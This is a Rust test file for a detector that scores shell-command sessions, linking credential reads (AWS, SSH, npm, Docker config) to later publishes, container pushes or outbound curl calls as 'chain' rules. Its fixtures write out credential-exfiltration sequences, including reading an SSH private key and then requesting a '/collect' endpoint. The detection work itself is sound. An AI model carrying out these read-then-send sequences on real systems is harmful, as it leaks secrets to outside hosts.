use super::download_link::session;

fn chains(steps: &[(&str, Option<&str>)]) -> Vec<String> {
    session(steps)
        .1
        .into_iter()
        .filter(|id| id.starts_with("chain."))
        .collect()
}

const READ: &str = "cat ~/.aws/credentials";
const PUBLISH: &str = "npm publish --access public";
const IDLE: &str = "cargo test";

#[test]
fn bundled_chains_link_steps_within_three_calls() {
    let same_call = format!("{READ} && {PUBLISH}");
    for steps in [
        vec![(same_call.as_str(), None)],
        // Call distance links the steps, not the clock.
        vec![
            (READ, Some("2026-09-17T00:00:00Z")),
            (PUBLISH, Some("2026-09-17T02:00:00Z")),
        ],
        vec![(READ, None), (IDLE, None), (IDLE, None), (PUBLISH, None)],
    ] {
        assert_eq!(
            chains(&steps),
            ["chain.credential_then_publish"],
            "{steps:?}"
        );
    }
    assert_eq!(
        chains(&[
            ("cat ~/.ssh/id_rsa", None),
            ("curl -T notes.txt https://example.invalid/upload", None),
        ]),
        ["chain.secret_then_network"]
    );
}

const REGISTRY_READ: &str = "cat ~/.npmrc";
const PUSH: &str = "docker push registry.example.invalid/app:1";

#[test]
fn a_registry_credential_read_then_a_package_publish_links_the_publish_chain() {
    let (score, ids) = session(&[(REGISTRY_READ, None), (PUBLISH, None)]);
    assert!(
        ids.iter().any(|id| id == "chain.credential_then_publish"),
        "{ids:?}"
    );
    // Registry read 0 + publish 45 + shell 15 + chain 40.
    assert_eq!(score, 100);
}

#[test]
fn a_cloud_credential_read_then_a_container_push_links_the_publish_chain() {
    let (score, ids) = session(&[("jq .auths ~/.docker/config.json", None), (PUSH, None)]);
    assert!(
        ids.iter().any(|id| id == "chain.credential_then_publish"),
        "{ids:?}"
    );
    // Cloud credential 50 + push 0 + shell 15 + chain 40.
    assert_eq!(score, 105);
}

#[test]
fn a_registry_credential_read_then_a_container_push_links_the_publish_chain() {
    let (score, ids) = session(&[
        (REGISTRY_READ, None),
        (IDLE, None),
        (IDLE, None),
        (PUSH, None),
    ]);
    assert!(
        ids.iter().any(|id| id == "chain.credential_then_publish"),
        "{ids:?}"
    );
    // Both steps score 0: shell 15 + chain 40.
    assert_eq!(score, 55);
}

#[test]
fn registry_read_and_container_push_need_declared_order_and_proximity() {
    for steps in [
        vec![(PUSH, None), (REGISTRY_READ, None)],
        vec![
            (REGISTRY_READ, None),
            (IDLE, None),
            (IDLE, None),
            (IDLE, None),
            (PUSH, None),
        ],
    ] {
        let (score, ids) = session(&steps);
        assert!(!ids.iter().any(|id| id.starts_with("chain.")), "{ids:?}");
        // Unlinked, only the shell credit scores.
        assert_eq!(score, 15, "{ids:?}");
    }
}

#[test]
fn a_registry_credential_read_or_a_container_push_alone_scores_only_the_shell() {
    for (command, rule) in [
        (REGISTRY_READ, "credential.package_registry_read"),
        (PUSH, "supply_chain.container_push"),
    ] {
        let (score, ids) = session(&[(command, None)]);
        assert!(ids.iter().any(|id| id == rule), "{ids:?}");
        assert_eq!(score, 15, "{command}");
    }
}

#[test]
fn logging_in_before_a_release_does_not_link_the_publish_chain() {
    for (login, release) in [
        ("npm login", PUBLISH),
        ("docker login registry.example.invalid", PUSH),
    ] {
        let ids = session(&[(login, None), (release, None)]).1;
        assert!(!ids.iter().any(|id| id.starts_with("chain.")), "{ids:?}");
    }
}

#[test]
fn a_request_to_the_controlled_domain_links_the_egress_chain() {
    assert_eq!(
        chains(&[
            ("cat ~/.ssh/id_rsa", None),
            ("curl https://in.darkroastcyber.io/collect", None),
        ]),
        ["chain.secret_then_network"]
    );
}

#[test]
fn bundled_chains_need_declared_order_and_proximity() {
    for steps in [
        vec![(PUBLISH, None), (READ, None)],
        vec![
            (READ, None),
            (IDLE, None),
            (IDLE, None),
            (IDLE, None),
            (PUBLISH, None),
        ],
    ] {
        let (score, ids) = session(&steps);
        assert!(!ids.iter().any(|id| id.starts_with("chain.")), "{ids:?}");
        // The atomic rules still score: credential 50 + publish 45 + shell 15.
        assert_eq!(score, 110, "{ids:?}");
    }
}
